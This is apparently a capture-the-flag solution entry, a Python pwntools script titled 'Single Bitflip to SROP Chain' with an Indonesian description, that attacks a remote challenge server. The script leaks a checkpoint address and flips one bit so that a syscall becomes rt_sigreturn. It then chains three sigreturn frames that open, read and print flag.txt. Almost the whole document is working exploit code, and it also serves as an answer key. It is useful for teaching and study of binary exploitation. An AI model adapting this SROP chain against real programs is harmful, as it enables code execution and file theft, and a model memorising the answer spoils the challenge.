        "title": "Single Bitflip to SROP Chain (solve.py)",
        "content": "Script Python pwntools yang menghitung alamat checkpoint, memicu bit-flip 0x0e -> 0x0f via /proc/self/mem, menyusun signal frame SROP untuk openat, read, dan write ke stdout, serta menerima flag.",
        "code": "#!/usr/bin/env python3\nfrom pwn import *\nimport re\nimport struct\n\ncontext.arch = \"amd64\"\n\n\ndef frame(**registers):\n    current = SigreturnFrame()\n    for name, value in registers.items():\n        setattr(current, name, value)\n    return bytearray(bytes(current))\n\n\ndef build_payload(checkpoint):\n    base = checkpoint - 0x1509\n    arena = base + 0x6000\n    syscall = base + 0x151D\n\n    # The one-bit flip changes mov eax, 0xe into mov eax, 0xf (rt_sigreturn).\n    first = frame(rax=257, rdi=-100, rsi=arena + 0x20, rdx=0,\n                  r10=0, rsp=arena + 0xF8, rip=syscall)\n    second = frame(rax=0, rdi=3, rsi=arena + 0x100, rdx=0x80,\n                   rsp=arena + 0x1B0, rip=syscall)\n    third = frame(rax=1, rdi=1, rsi=arena + 0x100, rdx=0x80,\n                  rsp=arena + 0x260, rip=syscall)\n    # Reuse the first two words for the previous frame's CS/SS values.\n    struct.pack_into(\"<QQ\", third, 0, 0x33, 0x2B)\n\n    payload = bytearray(640)\n    payload[:248] = first\n    payload[0xF8:0xF8 + 248] = second\n    payload[0x1B0:0x1B0 + 248] = third\n    payload[0x20:0x28] = b\"flag.txt\"\n    return bytes(payload)\n\n\ndef main():\n    io = remote(\"pwn.securinets.tn\", 1001)\n    banner = io.recvuntil(b\"offset bit: \")\n    checkpoint = int(re.search(rb\"checkpoint (0x[0-9a-f]+)\", banner).group(1), 16)\n    io.sendline(b\"1 0\")\n    io.recvuntil(b\"record (640 bytes):\\n\")\n    io.send(build_payload(checkpoint))\n    print(io.recvall(timeout=2).decode(errors=\"replace\"), end=\"\")\n\n\nif __name__ == \"__main__\":\n    main()\n"
